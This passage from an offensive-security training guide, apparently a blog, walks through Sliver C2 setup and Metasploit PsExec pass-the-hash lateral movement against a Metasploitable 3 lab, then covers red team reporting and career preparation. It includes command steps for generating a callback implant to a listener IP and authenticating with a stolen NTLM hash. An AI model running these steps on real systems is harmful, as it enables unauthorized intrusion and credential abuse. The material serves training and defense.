C2 frameworks like Cobalt Strike, Brute Ratel, Covenant, and Sliver operate on a client-server model. A payload, often called an implant, beacon, or grunt, is executed on the victim machine. This implant initiates an outbound connection (a "callback") to a listener on the attacker's C2 server. This establishes a stable and often stealthy channel for command execution, data exfiltration, and further pivoting.46 These frameworks are designed to evade detection by mimicking legitimate network traffic (e.g., hiding in standard HTTPS or DNS traffic), are highly configurable to alter their network indicators, and support multi-operator collaboration on a single engagement.46

#### Tutorial: Setting up Sliver C2

Sliver is a powerful, open-source, Go-based C2 framework that serves as an excellent alternative to its commercial counterparts.49

- **Procedure:**
    
    1. **Installation:** Install the Sliver server and client on the Kali machine according to the official project documentation.
        
    2. **Server Launch:** Start the C2 server by running `sliver-server`. This will also launch an interactive operator console.
        
    3. **Listener Creation:** Inside the Sliver console, start a listener to accept incoming connections. For example, `http` will start a basic HTTP listener. Note the IP address and port it is bound to.
        
    4. **Implant Generation:** Generate the malicious payload that will be deployed to the victim. The command `generate --http <LISTENER_IP> --os windows --arch amd64` will create a standard Windows executable implant configured to call back to the specified HTTP listener.
        
    5. **Deployment and Execution:** The generated executable must be transferred to the Metasploitable 3 machine. The previously exploited WebDAV vulnerability provides a convenient channel for this. Once on the target, the implant is executed.
        
    6. **Callback and Interaction:** Back in the Sliver console, a new session will appear as the implant checks in. The `sessions` command lists all active implants. The `use <session_id>` command allows the operator to interact with the compromised host, executing commands through the covert C2 channel.
        
- **Detection:** As detailed by Wazuh's research, Sliver implants can be detected. YARA rules can be used to scan memory and disk for the implant's unique artifacts. Furthermore, Sysmon can be configured to detect the specific process behaviors and network connection patterns associated with the implant's execution and C2 communication.51
    

### Module 4.3: Lateral Movement and Domain Dominance

An adversary rarely lands on their ultimate target. The initial compromised host is merely a beachhead. The next objective is to move laterally through the network, escalating privileges and gaining access to more valuable systems, with the ultimate goal often being the Domain Controller.

#### Tutorial: Lateral Movement with PsExec

PsExec is a legitimate Microsoft administration tool that is part of the Sysinternals suite. It is widely used by system administrators to execute commands on remote computers. Because it is a legitimate, signed Microsoft tool, its traffic is often trusted by security products. Adversaries abuse this trust to move laterally within a network using stolen credentials.52

- **Vector:** PsExec operates over the SMB protocol (TCP port 445) and requires administrative credentials on the remote host. It can be used with a username and password, or with a username and the NTLM hash of the password (a technique known as "Pass-the-Hash").
    
- **Tool:** Metasploit Framework's `exploit/windows/smb/psexec` module.
    
- **Scenario:** Assume that through post-exploitation on Metasploitable 3, the NTLM password hash for the local `Administrator` account has been extracted. The goal is to use this hash to move laterally back to the same machine (or to a different hypothetical machine on the same network).
    
- **Procedure:**
    
    1. Load the PsExec module: `use exploit/windows/smb/psexec`.
        
    2. Configure the target and credentials:
        
        - `set RHOSTS <TARGET_IP>`
            
        - `set SMBUser Administrator`
            
        - `set SMBPass <NTLM_HASH_GOES_HERE>` (The module is designed to handle both plaintext passwords and NTLM hashes in this field).
            
    3. Execute the module: `exploit`.
        
- **Result:** The module will authenticate to the target's `ADMIN$` share, upload a malicious service executable, and use the Service Control Manager to start it. This service executes the payload, resulting in a new, SYSTEM-level Meterpreter session on the target. This successfully demonstrates the ability to move laterally using stolen credential material without needing the plaintext password.
    

### Module 4.4: The Red Team Report - Communicating Strategic Risk

The final report from a Red Team engagement is fundamentally different from a standard penetration test report. Its audience is not a developer or system administrator, but a CISO or other senior leader. Its purpose is not to list individual vulnerabilities, but to demonstrate a systemic failure in the organization's security program and to communicate strategic business risk.

- **Shifting the Narrative Focus:** The report must tell a compelling story of the attack path.
    
    - Instead of a simple finding, the narrative should be: "The simulated adversary, emulating the TTPs of a known financially motivated threat group, achieved initial access to the network by exploiting a public-facing web application (Apache Tomcat) that was misconfigured with default vendor credentials. This initial breach highlights a systemic weakness in the organization's external vulnerability and patch management program."
        
    - The MITRE ATT&CK mapping created in Module 4.1 should be used as the structural backbone of this narrative, walking the reader through each stage of the campaign from Initial Access to Impact.
        
- **Focusing on Business Impact:** The technical details are secondary to the business consequences.
    
    - For example: "By moving laterally from the initial web server to a key database server, the adversary was able to access and exfiltrate a sample of customer Personally Identifiable Information (PII). This demonstrated capability poses a significant risk of a large-scale data breach, which could result in substantial regulatory fines under GDPR, loss of customer trust, and reputational damage."
        
- **Analyzing Defensive Performance:** The most critical and valuable section of a Red Team report answers the question: "What did our defenses see?"
    
    - The analysis must be balanced and objective. "The initial compromise of the Tomcat server did not generate a high-priority alert in the SIEM, indicating a potential gap in application-level logging or a lack of specific detection rules for this type of activity. However, the subsequent lateral movement attempt using PsExec was successfully detected and alerted on by the EDR solution's behavioral analytics. This indicates that while internal east-west monitoring is effective, the security of the perimeter is brittle and requires immediate attention."
        
    - This approach provides the organization with a clear, evidence-based roadmap for security investment and improvement.
        

## Conclusion: The Path Forward & Building Your Arsenal

This doctrine provides a complete path from novice to operator. It covers the technical skills, the methodologies, and, most importantly, the mindset required to excel in offensive security. The journey from scanning ports to simulating a nation-state adversary is long, but the process outlined here provides a structured and repeatable framework for success. The work, however, is never truly over.

### Building Your Professional Portfolio

In a competitive job market, experience is king. For those entering the field, a well-crafted portfolio is the most effective way to demonstrate capability in the absence of a long work history. This portfolio is not a resume; it is a collection of tangible evidence that proves skill and methodology.53

- **Core Components:** A professional website or a well-organized GitHub repository is the ideal platform for a portfolio.53
    
- **Key Deliverables:** The three reports generated during this training program form the core of the portfolio. They must be sanitized to remove any sensitive information (like specific IP addresses if used in a public context) and presented professionally.
    
    1. **The Jr. Penetration Test Report (Phase I):** This document demonstrates a grasp of the fundamentals of enumeration, basic exploitation, and professional documentation.
        
    2. **The Advanced Penetration Test Report (Phase II):** This report showcases the ability to exploit complex application vulnerabilities, perform privilege escalation, and provide detailed, actionable technical remediation advice.
        
    3. **The Red Team Report (Phase IV):** This is the capstone project. It proves the ability to think strategically, emulate a realistic threat, analyze defensive performance, and communicate business risk to a leadership audience.
        
- This collection of work is more valuable than any single certification. It is tangible, verifiable proof of technical skill, methodological discipline, and professional communication ability.
    

### Preparing for the Interview

The final gate is the job interview. Preparation should focus on articulating the skills demonstrated in the portfolio and proving a deep understanding of the underlying concepts.56

- **Technical Questions:** Expect questions that test foundational knowledge.
    
    - "What is the difference between symmetric and asymmetric encryption?"
        
    - "Explain the mechanics of a UNION-based SQL injection attack."
        
    - "You have gained a shell on a Linux host as a user who is a member of the `docker` group. How do you escalate your privileges to root?"
        
- **Scenario-Based Questions:** These questions test judgment and methodology.
    
    - "During an assessment, you discover a file share containing thousands of files of unencrypted Personally Identifiable Information (PII). What is your immediate next step?" (The correct answer is not to exfiltrate the data. It is to stop, document the finding's location and potential impact, and immediately communicate the critical risk to the client contact as per the rules of engagement).
        
    - "Explain the risk of a stored Cross-Site Scripting (XSS) vulnerability to a non-technical project manager." (The answer should focus on business impact, such as account takeover, credential theft, and reputational damage, rather than technical jargon).
        
- **The Portfolio Walkthrough:** Be prepared to select one of the reports from the portfolio and walk the interviewer through it. Explain the methodology, the thought process behind the attack chain, why certain tools were chosen, and how the findings were translated into actionable business risk. This is the ultimate opportunity to demonstrate competence and professionalism.
    

The path outlined in this doctrine is rigorous. It is designed to be. The tools of the trade will change, new exploits will be discovered, and defenses will evolve. But the mindset—the persistent, creative, and disciplined approach of a true operator—will always be the most valuable weapon in the arsenal. The work is hard because the stakes are high. 

#### Summary

Here is a summarized table of attacks based on each level of your proposed career path. This table is designed to give you a clear, structured overview of the techniques you will master at each stage.

|   |   |   |
|---|---|---|
|**Level**|**Attack / Technique**|**Description & Objective**|
|**Jr. Pen Tester & SOC (Wazuh)**|**Initial Access & Enumeration**|_Objective: Gain an initial foothold on the target system by exploiting known vulnerabilities._|
||Brute-Force Attacks (SSH, FTP, Tomcat)|Systematically guessing credentials to gain unauthorized access to services.|
||WebDAV Misconfiguration|Uploading a web shell to a misconfigured WebDAV server to achieve Remote Code Execution (RCE).|
||WordPress Vulnerable Plugin|Exploiting a known vulnerability in a WordPress plugin to gain access to the underlying server.|
||Apache Tomcat Manager RCE|Using default or weak credentials to access the Tomcat Manager and deploy a malicious WAR file for RCE.|
||Jenkins Script Console RCE|Abusing the Jenkins Groovy script console, often accessible without authentication, to execute arbitrary code.|
||Elasticsearch RCE (CVE-2014-3120)|Exploiting a remote code execution vulnerability in an older version of Elasticsearch to take control of the server.|
|**Pen Tester**|**Post-Exploitation**|_Objective: Escalate privileges, move laterally through the network, and exfiltrate data._|
||Windows Privilege Escalation|Exploiting weak service permissions, misconfigurations, or kernel vulnerabilities to elevate from a standard user to an administrator.|
||Lateral Movement (PsExec/SMB)|Using tools like PsExec to pivot from a compromised machine to other systems on the same network.|
||Living Off the Land (LotL)|Using pre-existing, legitimate tools on the target system (like PowerShell, WMI) to perform malicious actions and evade detection.|
||Data Exfiltration|Stealing and extracting sensitive data from the network using methods like DNS tunneling or HTTP-based transfers.|
|**OSCP Exam**|**Problem Solving & Vulnerability Chaining**|_Objective: Demonstrate practical, creative, and persistent hacking skills under pressure._|
||Buffer Overflows|Exploiting memory corruption vulnerabilities in custom applications to gain a shell.|
||Web Application Exploit Chains|Combining multiple web vulnerabilities (e.g., LFI with log poisoning) to achieve RCE.|
||Creative Pivoting|Using a compromised host to access and exploit other machines in internal, non-routable networks.|
||Bypassing Simple Filters|Finding clever ways to circumvent basic security controls and input validation to successfully execute an attack.|
|**Red Team**|**Adversary Emulation & Stealth**|_Objective: Emulate a specific threat actor to test the organization's detection and response capabilities over a prolonged period._|
||C2 Framework Operations (Sliver, Covenant)|Using Command and Control frameworks to maintain long-term, stealthy access and manage compromised assets.|
||Defense Evasion|Bypassing advanced security solutions like EDR, application whitelisting, and network monitoring.|
||Active Directory Attacks (Kerberoasting)|Abusing Kerberos features to harvest service account credentials for privilege escalation and lateral movement.|
||Social Engineering & Phishing|Manipulating employees to gain credentials, execute malicious code, or obtain physical access.|
||Objective-Driven Attacks|Focusing on achieving specific, high-value goals (e.g., accessing the "crown jewels") rather than simply finding all possible vulnerabilities.|


> To get in touch with me or for general discussion please visit [ZeroDayMindset Discussion](https://github.com/orgs/X3N0-G0D/discussions) 
{: .prompt-info }
